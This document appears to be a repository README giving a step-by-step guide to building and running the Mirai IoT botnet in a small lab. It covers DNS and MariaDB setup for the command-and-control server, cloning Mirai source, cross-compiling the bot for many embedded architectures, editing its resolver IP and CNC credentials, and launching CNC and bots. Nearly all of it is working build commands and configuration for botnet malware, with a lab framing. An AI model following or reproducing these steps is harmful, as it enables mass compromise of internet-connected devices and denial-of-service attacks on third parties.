# Mirai-Setup-Guide
In this Experiment, I found a way to build a MIRAI botnet.

# *Environment*
1. Fedora27 x64 workstaion with over 16G MEM.
2. Network capabilities.
3. VMware-station or vbox.

# *Requirements*
```bash
dnf install git gcc golang ElectricFence mysql mariadb-server mariadb-common bind bind-utils
dnf groupinstall "Development Tools" -y
dnf install gmp-devel -y
```

## Section 1 Setup dns server
### 1-1 Stop Dns server
```bash systemctl stop named
```
### 1-2 Edit /etc/named.conf
```conf
acl "trusted" {
	192.168.241.1; // Self DNS-server ip
};
options {
	listen-on port 53 { any; };
	listen-on-v6 port 53 { any; };
	directory 	"/var/named";
	dump-file 	"/var/named/data/cache_dump.db";
	statistics-file "/var/named/data/named_stats.txt";
	memstatistics-file "/var/named/data/named_mem_stats.txt";
	allow-query     { any; };

	recursion yes;

	dnssec-enable yes;
	dnssec-validation yes;

	managed-keys-directory "/var/named/dynamic";

	pid-file "/run/named/named.pid";
	session-keyfile "/run/named/session.key";

	/* https://fedoraproject.org/wiki/Changes/CryptoPolicy */
	include "/etc/crypto-policies/back-ends/bind.config";
};

logging {
        channel default_debug {
                file "data/named.run";
                severity dynamic;
        };
};

zone "." IN {
	type hint;
	file "named.ca";
};

include "/etc/named.rfc1912.zones";
include "/etc/named.root.key";

```
### 1-3 Edit /etc/named.rfc1912.zones
```conf
zone "changeme.com" IN {
	type master;
	file "changeme.com";
	allow-update { none; };
};
```
### 1-4 Restart named
```bash
systemctl start named
```

## Section 2 Setup mariadb-server mirai databases
### 2-1 Create mysql root password
```bash
mysqladmin -u root password password
```
### 2-2 Run ./scripts/db.sql
```bash
cat ./scripts/db.sql | mysql -uroot -p
```
### 2-3 Add cnc login account
```mysql
INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
```

## Section 3 Compile Mirai code
### 3-1 Download the Mirai code
```bash
git clone https://github.com/jgamblin/Mirai-Source-Code.git

wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2

tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2

rm *.tar.bz2

mv cross-compiler-armv4l armv4l
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv6l armv6l
```
### 3-2 Make go home DIR
```bash
mkdir ~/go
```
### 3-3 Adding xcompile path in .bashrc
```bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
```
*source .bashrc*
```bash
source ~/.bashrc
```
### 3-4 Install GoLang Drivers
```bash
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellword
```
### 3-5 Edit Mirai code
*Edit ./mirai/bot/resolv.c DNS server ip*
```c
struct resolv_entries *resolv_lookup(char *domain)
{
    /*
       Missing code ...
     */
    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(192,168,241,1); //Change here
    addr.sin_port = htons(53);

    /*
       Missing code ...
     */
}

```
*Edit ./mirai/cnc/main.go*
```go
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "password" //Change here
const DatabaseTable string  = "mirai"
```
*Edit ./mirai/cnc/admin.go*
```go
headerb, err := ioutil.ReadFile("/root/Mirai_Code/mirai/prompt.txt") //Change here
```
### 3-6 Compile
```bash
cd ./mirai
./build.sh debug telnet
./build.sh release telnet
cd ../loader
./build.sh
```

## Section 4 Run Mirai Net
### 4-1 Run ./mirai/debug/cnc as root on PC:192.168.241.1
```bash
./mirai/debug/cnc
```
### 4-2 Telnet cnc
```bash
telnet 127.0.0.1
```
### 4-3 Run ./mirai/debug/mirai.dbg as root on VM-PCs
*VM-PC1:192.168.241.108*

*VM-PC2:192.168.241.109*

*VM-PC3:192.168.241.110*

